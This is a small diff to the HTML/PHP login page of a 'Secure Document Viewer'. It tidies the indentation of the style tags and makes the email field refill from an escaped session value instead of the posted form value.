@@ -5,7 +5,7 @@
     <meta charset="UTF-8">
     <title>Secure Document Viewer</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <style>
+   <style>
         /* Global reset / basics */
         * { box-sizing: border-box; margin: 0; padding: 0; }
 
@@ -182,7 +182,7 @@
             }
             .doc-title { font-size: 16px; }
         }
-    </style> 
+    </style>
 </head>
 <body>
 <div class="page-wrapper">
@@ -209,7 +209,9 @@
         <form class="login-form" method="POST" action="login.php" autocomplete="off">
             <label class="field-label" for="email">Email address</label>
             <div class="field-wrapper">
-                <input id="email" name="email" type="email" value="<?= isset($_POST['email']) ? htmlspecialchars($_POST['email']) : '' ?>" placeholder="Enter your email" required>
+                <input id="email" name="email" type="email"
+                       value="<?= isset($_SESSION['old_email']) ? htmlspecialchars($_SESSION['old_email']) : '' ?>"
+                       placeholder="Enter your email" required>
             </div>
 
             <label class="field-label" for="name">Name</label>
